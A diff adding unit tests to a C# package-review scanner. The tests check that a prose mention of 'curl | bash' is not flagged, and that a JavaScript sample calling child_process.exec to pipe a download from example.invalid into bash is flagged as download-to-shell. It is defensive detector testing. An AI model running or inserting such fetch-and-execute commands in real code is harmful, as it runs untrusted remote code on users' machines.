@@ -1531,6 +1531,16 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal(level, finding.Level);
     }
 
+    // Prose naming the curl-to-shell pattern is not a command (fix(web) for download-to-shell).
+    [Fact]
+    public void A_curl_pipe_named_in_prose_without_an_argument_is_not_a_download_to_shell()
+    {
+        var prose = "const rule = 'Downloading and executing code from external sources, e.g. `curl | bash`, is unsafe.';\nmodule.exports = rule;\n";
+        Assert.DoesNotContain(PackageReview.Scan("index.js", prose, install: false, default, entry: true, peel: false), f => f.Rule == "package/download-to-shell");
+        var command = "const rule = 'run `curl | bash`';\nrequire('child_process').exec('curl https://example.invalid/i | bash');\n";
+        Assert.Contains(PackageReview.Scan("index.js", command, install: false, default, entry: true, peel: false), f => f is { Rule: "package/download-to-shell", Level: "noteworthy" });
+    }
+
     // A comment that quotes a run key is not a logon start (fix(web) for logon-start).
     [Fact]
     public void A_run_key_named_only_in_a_comment_is_not_a_logon_start()
@@ -1665,6 +1675,7 @@ public sealed class PackageReviewTests : IDisposable
             ("helper-1.0.dist-info/METADATA", U("Metadata-Version: 2.1\nName: helper\nVersion: 1.0\n"))));
         Assert.Contains("script 'ssh' (helper-1.0.data/scripts/ssh)", Assert.Single(r.Findings, f => f.Rule == "package/command-name").Detail, StringComparison.Ordinal);
     }
+
     [Fact]
     public void Dependencies_from_git_or_a_tarball_are_review_alone_and_noteworthy_beside_an_install_script()
     {
